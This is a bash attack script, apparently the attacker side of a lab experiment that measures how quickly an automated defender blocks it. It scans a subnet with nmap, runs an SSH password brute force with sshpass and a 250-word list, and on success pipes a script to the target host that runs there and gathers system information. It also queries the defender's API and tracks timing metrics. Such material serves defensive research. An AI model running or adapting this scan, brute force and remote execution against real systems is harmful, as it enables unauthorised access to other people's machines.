#!/bin/bash

# Attack script for compromised container
# Performs: 1) Network discovery, 2) SSH port discovery, 3) Brute force attack

set -e

# Configuration
SERVER_IP="172.31.0.10"
COMPROMISED_IP="172.30.0.10"
WORDLIST_FILE="/tmp/wordlist.txt"
CORRECT_PASSWORD="adminadmin"
SSH_USER="admin"
LOG_FILE="/tmp/attack_log.txt"

# Enhanced monitoring variables
SSH_ATTEMPTS=0
TOTAL_ATTEMPTS_BEFORE_BLOCKED=0
SSH_PORT_BLOCKED_TIME=""
SSH_PORT_ALREADY_BLOCKED="false"
TIME_TO_BLOCKED_SECONDS=""
TIME_TO_PLAN_GENERATION_SECONDS=""
PLAN_GENERATION_ALERT_TYPE=""
SCAN_NETWORK_SUCCESS="false"
SCAN_PORT_SUCCESS="false"
CURRENT_PASSWORD_ATTEMPT="none"
LAST_PASSWORD_TRIED="none"

# Create a wordlist with 250 passwords including the correct one
create_wordlist() {
    echo "Creating wordlist with 250 passwords..."

    # Common passwords to make up the bulk of the list
    cat > "$WORDLIST_FILE" << 'EOF'
123456
password
qwerty
admin
letmein
welcome
monkey
1234567890
password123
abc123
111111
123123
dragon
master
hello
freedom
whatever
qazwsx
trustno1
123qwe
zxcvbn
sunshine
iloveyou
princess
football
baseball
shadow
superman
michael1
ninja
asdfgh
jessica
lovely
654321
pokemon
slayer
helpme
131313
killer
trustno1
welcome
samantha
matrix
dallas
austin
thunder
tigger
mickey
george
191919
chicago
jordan
liverpool
internet
soccer
harley
nicole
daniel
abgrtyu
merlin
heaven
michael1
ranger
diamond
corvette
ernie
hammer
ferrari
alexander
buster
teddy
sunset
tester
william
patrick
marlboro
scooter
sammy
matrix
kitten
tiger
rabbit
patrick
merlin
chicken
buster
ferrari
diamond
bastian
arturo
ranger
hammer
summer
broncos
cowboys
yankees
jordan
cameron
soccer
football
baseball
tennis
guitar
player
mustang
silver
golden
eagle
warrior
panther
tornado
lightning
thunder
hurricane
volcano
earthquake
tsunami
blizzard
wildfire
avalanche
landslide
explosive
dynamite
nitro
fusion
reactor
plasma
laser
phaser
tractor
bulldozer
excavator
helicopter
airplane
submarine
battleship
aircraft
missile
torpedo
grenade
sniper
assassin
warrior
champion
victory
triumph
conquest
dominion
supremacy
ultimate
infinity
eternal
legendary
mystical
magical
fantastic
wonderful
amazing
incredible
fantastic
extraordinary
spectacular
magnificent
phenomenal
outstanding
remarkable
exceptional
unbelievable
astonishing
breathtaking
awe-inspiring
mind-boggling
earth-shattering
groundbreaking
revolutionary
innovative
cutting-edge
state-of-the-art
advanced
sophisticated
complex
intricate
complicated
challenging
difficult
impossible
unbreakable
invincible
unstoppable
indestructible
immortal
eternal
infinite
limitless
boundless
endless
timeless
ageless
ancient
primeval
prehistoric
medieval
modern
futuristic
advanced
superior
ultimate
extreme
maximum
minimum
optimal
perfect
ideal
flawless
impeccable
pristine
pure
sacred
divine
holy
blessed
cursed
damned
forbidden
taboo
secret
mystery
enigma
puzzle
riddle
challenge
obstacle
barrier
threshold
gateway
portal
 doorway
entrance
exit
escape
freedom
liberty
justice
truth
wisdom
knowledge
power
strength
courage
bravery
honor
glory
fame
fortune
wealth
success
victory
triumph
achievement
accomplishment
fulfillment
satisfaction
happiness
joy
bliss
ecstasy
rapture
paradise
heaven
nirvana
eden
utopia
shangri-la
atlantis
avalon
camelot
elysium
valhalla
olympus
asgard
midgard
niflheim
muspelheim
alfheim
svartalfheim
nidavellir
helheim
jotunheim
vanaheim
EOF

      # Insert the correct password at position 1 if first-try mode, otherwise random position
    if [[ "$FIRST_TRY" == "true" ]]; then
        echo "$CORRECT_PASSWORD" | cat - "$WORDLIST_FILE" > temp && mv temp "$WORDLIST_FILE"
        echo "Wordlist created with $(wc -l < "$WORDLIST_FILE") passwords"
        echo "First-try mode: Correct password '$CORRECT_PASSWORD' is at position: $(grep -n "^$CORRECT_PASSWORD$" "$WORDLIST_FILE" | cut -d: -f1)"
    else
        CORRECT_POS=$((1 + RANDOM % 250))
        echo "$CORRECT_PASSWORD" | sed -i "${CORRECT_POS}i $CORRECT_PASSWORD" "$WORDLIST_FILE"

        # Shuffle the wordlist randomly
        shuf "$WORDLIST_FILE" -o "$WORDLIST_FILE"

        echo "Wordlist created with $(wc -l < "$WORDLIST_FILE") passwords"
        echo "Correct password '$CORRECT_PASSWORD' is at position: $(grep -n "^$CORRECT_PASSWORD$" "$WORDLIST_FILE" | cut -d: -f1)"
    fi
}

# Fast ping function for SSH port monitoring
fast_ping_ssh() {
    local timeout_duration=${1:-0.1}

    # Try multiple methods to detect if port is blocked
    # Method 1: TCP connect test
    if timeout "$timeout_duration" bash -c "</dev/tcp/$SERVER_IP/22" 2>/dev/null; then
        return 0  # Port is open
    fi

    # Method 2: nmap port test (fallback)
    if timeout 2 nmap -p 22 "$SERVER_IP" 2>/dev/null | grep -q "22/tcp.*open"; then
        return 0  # Port is open according to nmap
    fi

    return 1  # Port is closed/blocked
}

# Query defender API for plan generation information
get_defender_plan_info() {
    log_message "Querying defender API for plan generation information..."

    # Get defender port from environment or use default
    local defender_port="${DEFENDER_PORT:-8000}"
    local defender_host="172.31.0.1"  # Assuming defender runs on the host network

    # Try to get plan generation info from defender API
    local api_response=""
    local attempts=0
    local max_attempts=3

    while [[ $attempts -lt $max_attempts && -z "$api_response" ]]; do
        api_response=$(curl -s --max-time 5 \
            -H "Content-Type: application/json" \
            "http://$defender_host:$defender_port/api/plans" 2>/dev/null || echo "")

        if [[ -z "$api_response" ]]; then
            log_message "Attempt $((attempts + 1)) failed to reach defender API, retrying..."
            sleep 1
        fi
        attempts=$((attempts + 1))
    done

    if [[ -n "$api_response" ]]; then
        log_message "Defender API response received"
        # Parse the response to extract plan generation time and alert type
        # Try to extract timestamp of first plan
        local plan_time=$(echo "$api_response" | grep -o '"created_at":[^,]*' | head -1 | cut -d: -f2 | tr -d '" ' | head -c 20)
        local alert_type=$(echo "$api_response" | grep -o '"trigger_event":[^,]*' | head -1 | cut -d: -f2 | tr -d '" ' | head -c 50)

        if [[ -n "$plan_time" ]]; then
            # Convert to seconds since attack start
            local plan_timestamp=$(date -d "$plan_time" +%s 2>/dev/null)
            local start_timestamp=$(date -d "$START_TIME" +%s)

            if [[ -n "$plan_timestamp" && -n "$start_timestamp" ]]; then
                TIME_TO_PLAN_GENERATION_SECONDS=$((plan_timestamp - start_timestamp))
                PLAN_GENERATION_ALERT_TYPE="${alert_type:-unknown}"
                log_message "Plan generation detected: ${TIME_TO_PLAN_GENERATION_SECONDS}s after start, trigger: ${PLAN_GENERATION_ALERT_TYPE}"
            else
                log_message "Could not parse plan timestamp from: $plan_time"
            fi
        else
            log_message "No plan creation timestamp found in defender response"
        fi
    else
        log_message "No response from defender API after $max_attempts attempts"
        # Try alternative API endpoints or methods
        api_response=$(curl -s --max-time 3 "http://$defender_host:$defender_port/api/alerts" 2>/dev/null || echo "")
        if [[ -n "$api_response" ]]; then
            log_message "Found alerts endpoint, checking for relevant alerts..."
            # Look for alerts related to our attack
            local relevant_alert=$(echo "$api_response" | grep -A5 -B5 "172.30.0.10\|SSH\|brute" 2>/dev/null || echo "")
            if [[ -n "$relevant_alert" ]]; then
                PLAN_GENERATION_ALERT_TYPE="ssh_brute_force_detected"
                log_message "SSH brute force alert detected via alerts API"
            fi
        fi
    fi

    # Fallback: try to check if defender has created any files indicating plan generation
    if [[ -z "$TIME_TO_PLAN_GENERATION_SECONDS" ]]; then
        # Check for defender log files or other indicators
        local defender_indicators=$(find /tmp -name "*defender*" -o -name "*slips*" 2>/dev/null | head -5)
        if [[ -n "$defender_indicators" ]]; then
            PLAN_GENERATION_ALERT_TYPE="file_based_detection"
            log_message "Defender activity detected via file system"
        fi
    fi
}

# Log function with real-time flushing
log_message() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
    # Force flush to disk immediately
    sync "$LOG_FILE" 2>/dev/null || true
    # Also flush stdio buffers
    stdbuf -oL -eL echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Function to create summary with current state
create_summary() {
    local completion_status="${1:-interrupted}"
    local success_value="${2:-interrupted}"
    local guess_success="false"

    # Determine if password was found based on success variable
    if [[ "$success" == "true" ]]; then
        guess_success="true"
    fi

    cat > /tmp/attack_summary.json << EOF
{
    "attack_id": "$ATTACK_ID",
    "attacker_ip": "$COMPROMISED_IP",
    "target_ip": "$SERVER_IP",
    "start_time": "$START_TIME",
    "end_time": "$(date -Iseconds)",
    "scan_network_successfully": $SCAN_NETWORK_SUCCESS,
    "scan_port_successfully": $SCAN_PORT_SUCCESS,
    "guess_password_successfully": $guess_success,
    "time_to_blocked_seconds": ${TIME_TO_BLOCKED_SECONDS:-null},
    "time_to_plan_generation_seconds": ${TIME_TO_PLAN_GENERATION_SECONDS:-null},
    "first_plan_alert": "${PLAN_GENERATION_ALERT_TYPE:-$completion_status}",
    "opencode_running_compromised": null,
    "opencode_running_server": null,
    "total_attempts_before_blocked": $TOTAL_ATTEMPTS_BEFORE_BLOCKED,
    "current_attempt": $SSH_ATTEMPTS,
    "current_password": "$CURRENT_PASSWORD_ATTEMPT",
    "last_password_tried": "$LAST_PASSWORD_TRIED",
    "phases_completed": "$completion_status",
    "success": $success_value,
    "log_file": "$LOG_FILE",
    "last_update": "$(date -Iseconds)"
}
EOF

    # Force flush summary to disk immediately
    sync /tmp/attack_summary.json 2>/dev/null || true
}

# Real-time summary update function - called continuously during attack
update_real_time_summary() {
    local completion_status="${1:-ongoing}"
    local success_value="${2:-false}"
    local guess_success="false"
    local current_password="${3:-none}"

    # Update tracking variables
    CURRENT_PASSWORD_ATTEMPT="$current_password"
    LAST_PASSWORD_TRIED="$current_password"

    # Determine if password was found based on success variable
    if [[ "$success_value" == "true" ]]; then
        guess_success="true"
    fi

    cat > /tmp/attack_summary.json << EOF
{
    "attack_id": "$ATTACK_ID",
    "attacker_ip": "$COMPROMISED_IP",
    "target_ip": "$SERVER_IP",
    "start_time": "$START_TIME",
    "end_time": "$(date -Iseconds)",
    "scan_network_successfully": $SCAN_NETWORK_SUCCESS,
    "scan_port_successfully": $SCAN_PORT_SUCCESS,
    "guess_password_successfully": $guess_success,
    "time_to_blocked_seconds": ${TIME_TO_BLOCKED_SECONDS:-null},
    "time_to_plan_generation_seconds": ${TIME_TO_PLAN_GENERATION_SECONDS:-null},
    "first_plan_alert": "${PLAN_GENERATION_ALERT_TYPE:-none}",
    "opencode_running_compromised": null,
    "opencode_running_server": null,
    "total_attempts_before_blocked": $TOTAL_ATTEMPTS_BEFORE_BLOCKED,
    "current_attempt": $SSH_ATTEMPTS,
    "current_password": "$CURRENT_PASSWORD_ATTEMPT",
    "last_password_tried": "$LAST_PASSWORD_TRIED",
    "phases_completed": "$completion_status",
    "success": $success_value,
    "log_file": "$LOG_FILE",
    "last_update": "$(date -Iseconds)"
}
EOF

    # Force flush to disk
    sync /tmp/attack_summary.json 2>/dev/null || true
}

# Trap signals to exit gracefully
cleanup() {
    log_message "Attack interrupted - cleaning up..."
    # Create summary even if interrupted
    if [[ -n "$ATTACK_ID" ]]; then
        create_summary "interrupted" "interrupted"
        log_message "Attack summary created due to interruption"
    fi
    exit 130
}

# Trap EXIT to ensure summary is always created
ensure_summary() {
    local exit_code=$?
    log_message "Attack process ending with exit code: $exit_code"

    # Always create summary if we have an ATTACK_ID
    if [[ -n "$ATTACK_ID" ]]; then
        # Determine completion status based on exit code
        if [[ $exit_code -eq 137 ]]; then
            create_summary "terminated_by_defender" "false"
            log_message "Attack summary created - terminated by defender (SIGKILL)"
        elif [[ $exit_code -eq 124 ]]; then
            create_summary "timeout" "false"
            log_message "Attack summary created - timeout occurred"
        elif [[ $exit_code -eq 130 ]]; then
            # Already handled by cleanup() but ensure summary exists
            create_summary "interrupted" "interrupted"
            log_message "Attack summary created - user interruption"
        elif [[ $success == "true" ]]; then
            create_summary "completed_successfully" "true"
            log_message "Attack summary created - completed successfully"
        else
            create_summary "completed_without_success" "false"
            log_message "Attack summary created - completed without success"
        fi
    fi
}

# Set up signal handlers
trap cleanup INT TERM
trap ensure_summary EXIT

# Attack phases
attack_phase_1() {
    log_message "Phase 1: Network discovery - Aggressive scanning for hosts in 172.31.0.0/24"
    update_real_time_summary "phase1_network_scan" "false" "none"
    if nmap -sP 172.31.0.0/24 -oN /tmp/nmap_discovery.txt; then
        SCAN_NETWORK_SUCCESS="true"
        log_message "Phase 1 completed successfully"
        update_real_time_summary "phase1_completed" "false" "none"
    else
        SCAN_NETWORK_SUCCESS="false"
        log_message "Phase 1 completed with errors"
        update_real_time_summary "phase1_failed" "false" "none"
    fi
}

attack_phase_2() {
    log_message "Phase 2: Aggressive port scanning - Looking for SSH on server $SERVER_IP"
    update_real_time_summary "phase2_port_scan" "false" "none"
    if nmap -sV -Pn "$SERVER_IP" -oN /tmp/nmap_ports.txt; then
        SCAN_PORT_SUCCESS="true"
        log_message "Phase 2 completed successfully"
        update_real_time_summary "phase2_completed" "false" "none"
    else
        SCAN_PORT_SUCCESS="false"
        log_message "Phase 2 completed with errors"
        update_real_time_summary "phase2_failed" "false" "none"
    fi
}

attack_phase_3() {
    log_message "Phase 3: Brute force attack - Starting SSH brute force on $SERVER_IP:22"
    log_message "Using wordlist with $(wc -l < "$WORDLIST_FILE") passwords"
    update_real_time_summary "phase3_bruteforce_start" "false" "none"

    # Ensure ssh client and curl are available
    if ! command -v ssh &> /dev/null; then
        log_message "Installing openssh-client..."
        apt-get update > /dev/null 2>&1
        apt-get install -y openssh-client > /dev/null 2>&1
        log_message "SSH client installation completed"
    fi

    if ! command -v curl &> /dev/null; then
        log_message "Installing curl for defender API queries..."
        apt-get install -y curl > /dev/null 2>&1
        log_message "Curl installation completed"
    fi

    # Simple SSH brute force script
    attempt=1
    total_passwords=$(wc -l < "$WORDLIST_FILE")
    success="false"

    log_message "Starting brute force with $total_passwords passwords"

    # Check if SSH port is already blocked before starting brute force
    log_message "Checking SSH port availability before starting brute force..."
    if fast_ping_ssh 0.1; then
        SSH_PORT_ALREADY_BLOCKED="false"
        log_message "SSH port is reachable - starting brute force attack"
    else
        SSH_PORT_ALREADY_BLOCKED="true"
        log_message "WARNING: SSH port is already blocked before brute force attack!"
    fi

    while IFS= read -r password; do
        # Skip empty lines
        [[ -z "$password" ]] && continue

        log_message "Attempt $attempt/$total_passwords: Trying password '$password'"
        SSH_ATTEMPTS=$((SSH_ATTEMPTS + 1))
        TOTAL_ATTEMPTS_BEFORE_BLOCKED=$SSH_ATTEMPTS  # Update continuously

        # Use sshpass for non-interactive SSH login
        if ! command -v sshpass &> /dev/null; then
            log_message "Installing sshpass..."
            apt-get update > /dev/null 2>&1
            apt-get install -y sshpass > /dev/null 2>&1
        fi

        # Attempt SSH connection with timeout and strict host key checking disabled
        output_file="/tmp/ssh_attempt_$attempt.log"
        if timeout 5 sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
            -o ConnectTimeout=3 -o BatchMode=no -o PreferredAuthentications=password \
            -o PubkeyAuthentication=no -o ServerAliveInterval=1 -o ServerAliveCountMax=1 \
            "$SSH_USER"@"$SERVER_IP" "exit" > "$output_file" 2>&1; then

            log_message "SUCCESS: Password found! '$password' is the correct password"
            echo "[$(date '+%Y-%m-%d %H:%M:%S')] SUCCESS: Password '$password' found for $SSH_USER@$SERVER_IP:22 (attempt $attempt)" >> /tmp/hydra_results.txt

            # NEW PHASE: Large file transfer to confirm successful SSH connection
            log_message "Starting large file transfer phase to demonstrate successful SSH access..."

            # Create a large script file on the attacker machine first
            LARGE_SCRIPT="/tmp/large_script.sh"
            log_message "Creating large script file (~50KB) for transfer..."

            cat > "$LARGE_SCRIPT" << 'EOF'
#!/bin/bash
# Large script for testing SSH file transfer detection
# This script generates significant network traffic when transferred via SSH

echo "=========================================================="
echo "LARGE SCRIPT EXECUTION STARTED"
echo "=========================================================="

# Generate lots of output to create network traffic
for i in {1..1000}; do
    echo "Processing data chunk $i: This is a large amount of text to simulate file transfer operations over SSH connection"

    # Generate some random data
    dd if=/dev/urandom bs=1024 count=1 2>/dev/null | base64 | head -c 50

    echo "Intermediate result $i: $(date)"

    # Create some dummy file content
    echo "Dummy file content for line $i with lots of padding text to make it larger and more detectable in network traffic analysis" >> /tmp/dummy_output.txt

    if (( i % 100 == 0 )); then
        echo "Progress checkpoint: $i/1000 completed"
        df -h
        ps aux | head -5
        whoami
        pwd
        ls -la /tmp/ | head -10
    fi

    sleep 0.1
done

echo "=========================================================="
echo "LARGE SCRIPT EXECUTION COMPLETED"
echo "=========================================================="

# Additional large operations to generate more traffic
echo "Starting system information collection..."
uname -a > /tmp/system_info.txt
cat /proc/version >> /tmp/system_info.txt
cat /proc/meminfo >> /tmp/system_info.txt
cat /proc/cpuinfo >> /tmp/system_info.txt

# Create another large file
for j in {1..500}; do
    echo "Large data entry $j: $(date) - Random padding text to make this file bigger and easier to detect in network traffic analysis" >> /tmp/large_data_file.txt
done

echo "All operations completed successfully. SSH connection was established and used for large file transfers."
EOF

            # Transfer and execute the large script via SSH
            log_message "Transferring large script to target server and executing..."
            if sshpass -p "$password" ssh -o StrictHostKeyChecking=no \
                -o ConnectTimeout=10 -o BatchMode=no \
                "$SSH_USER"@"$SERVER_IP" "bash -s" < "$LARGE_SCRIPT" > /tmp/large_script_output.log 2>&1; then
                log_message "Large script transfer and execution completed successfully"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] LARGE_FILE_TRANSFER: Successfully transferred and executed large script via SSH" >> /tmp/hydra_results.txt
            else
                log_message "Large script transfer failed, but SSH connection was successful"
                echo "[$(date '+%Y-%m-%d %H:%M:%S')] LARGE_FILE_TRANSFER: Failed but SSH auth was successful" >> /tmp/hydra_results.txt
            fi

            success="true"
            break
        else
            # Log the error for debugging
            ssh_result=$(cat "$output_file" 2>/dev/null || echo "No output")
            if [[ $attempt -le 5 || $((attempt % 50)) -eq 0 ]]; then
                log_message "Attempt $attempt failed: ${ssh_result:0:100}..."
            fi
            rm -f "$output_file" 2>/dev/null

            # FAST PING MONITORING: Check if SSH port becomes blocked after failed attempt
            if [[ -z "$SSH_PORT_BLOCKED_TIME" ]]; then
                log_message "Monitoring SSH port availability after failed attempt..."
                if ! fast_ping_ssh 0.1; then
                    SSH_PORT_BLOCKED_TIME="$(date -Iseconds)"
                    TOTAL_ATTEMPTS_BEFORE_BLOCKED=$SSH_ATTEMPTS

                    # Calculate time to blocked
                    start_timestamp=$(date -d "$START_TIME" +%s)
                    blocked_timestamp=$(date -d "$SSH_PORT_BLOCKED_TIME" +%s)
                    TIME_TO_BLOCKED_SECONDS=$((blocked_timestamp - start_timestamp))

                    log_message "ALERT: SSH port became blocked after $SSH_ATTEMPTS attempts at $SSH_PORT_BLOCKED_TIME"
                    log_message "Time to blocked: ${TIME_TO_BLOCKED_SECONDS} seconds from start"
                else
                    log_message "SSH port still reachable after failed attempt"
                fi
            fi
        fi

        attempt=$((attempt + 1))

        # NOTE: Defender timing data will be extracted from auto_responder_timeline.jsonl after experiment completes

        # REAL-TIME SUMMARY UPDATE: Update summary after each SSH attempt
        update_real_time_summary "phase3_ssh_bruteforce" "$success" "$password"

        # NO MORE SLEEP - using fast ping monitoring instead
        # sleep 0.5  # REMOVED

    done < "$WORDLIST_FILE"

    if [ "$success" = "true" ]; then
        log_message "Phase 3 completed - SUCCESS: Password found!"
        SUCCESS="true"
    else
        log_message "Phase 3 completed - FAILED: No password found"
        echo "[$(date '+%Y-%m-%d %H:%M:%S')] FAILED: No valid password found for $SSH_USER@$SERVER_IP:22" >> /tmp/hydra_results.txt
        SUCCESS="false"
    fi
}

# Main execution
main() {
    log_message "Starting attack sequence from $COMPROMISED_IP targeting $SERVER_IP"
    log_message "Attack started at $(date)"

    # Create initial summary
    update_real_time_summary "attack_started" "false" "none"

    # Create wordlist
    create_wordlist

    # Phase 1: Network discovery
    attack_phase_1

    # Wait a bit between phases
    sleep 5

    # Phase 2: Port discovery
    attack_phase_2

    # Wait a bit between phases
    sleep 5

    # Phase 3: Brute force
    attack_phase_3

    log_message "Attack completed at $(date)"
    log_message "Final result: $SUCCESS"

    # NOTE: Defender timing data will be extracted from auto_responder_timeline.jsonl after experiment completes

    # Create summary using the unified function
    if [[ "$success" == "true" ]]; then
        create_summary "completed_successfully" "true"
    else
        create_summary "completed_without_success" "false"
    fi

    echo "Attack summary saved to /tmp/attack_summary.json"
}

# Initialize variables
ATTACK_ID=""
FIRST_TRY="false"
START_TIME="$(date -Iseconds)"
SUCCESS="false"

# Parse command line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --first-try)
            FIRST_TRY="true"
            shift
            ;;
        *)
            if [[ -z "$ATTACK_ID" ]]; then
                ATTACK_ID="$1"
            fi
            shift
            ;;
    esac
done

# Set default attack ID if not provided
if [[ -z "$ATTACK_ID" ]]; then
    ATTACK_ID=$(date +%s)
fi

# Run the attack
main "$@"